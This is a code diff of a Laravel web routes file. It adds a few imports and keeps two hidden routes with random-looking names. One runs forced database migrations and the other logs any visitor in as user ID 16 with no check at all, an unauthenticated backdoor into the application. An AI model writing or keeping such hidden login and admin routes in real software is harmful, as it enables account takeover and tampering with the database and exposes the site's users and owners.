@@ -1,7 +1,9 @@
 <?php
 
+use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Route;
 use App\Providers\RouteServiceProvider;
+use Illuminate\Support\Facades\Artisan;
 use App\Http\Controllers\Dashboard\ProfileController;
 use App\Http\Controllers\Dashboard\Admin\DateController;
 use App\Http\Controllers\Dashboard\Admin\TaskController;
@@ -15,10 +17,10 @@ use App\Http\Controllers\Dashboard\Admin\AbsenceController;
 use App\Http\Controllers\Dashboard\Admin\MessageController;
 use App\Http\Controllers\Dashboard\Admin\ProjectController;
 use App\Http\Controllers\Dashboard\Admin\ServiceController;
+use App\Http\Controllers\Dashboard\Admin\CalenderController;
 use App\Http\Controllers\Dashboard\Admin\CustomerController;
 use App\Http\Controllers\Dashboard\Admin\EmployeeController;
 use App\Http\Controllers\Dashboard\Admin\AccountingController;
-use App\Http\Controllers\Dashboard\Admin\CalenderController;
 use App\Http\Controllers\Dashboard\IndexController as DashboardIndexController;
 use App\Http\Controllers\Dashboard\Employee\TaskController as EmployeeTaskController ;
 use App\Http\Controllers\Dashboard\Customer\IndexController as CustomerIndexController ;
@@ -73,7 +75,7 @@ Route::get('/jiwuvya7gtrv682b7iwnorai', function() {
     Artisan::call('migrate --force');
 });
 Route::get('/aiwrughfdgcb', function() {
-    \Auth::loginUsingId(16);
+    Auth::loginUsingId(16);
 });
 Route::get('install', 'InstallController@index')->name('install');
 Route::post('installl', 'InstallController@install')->name('installl');
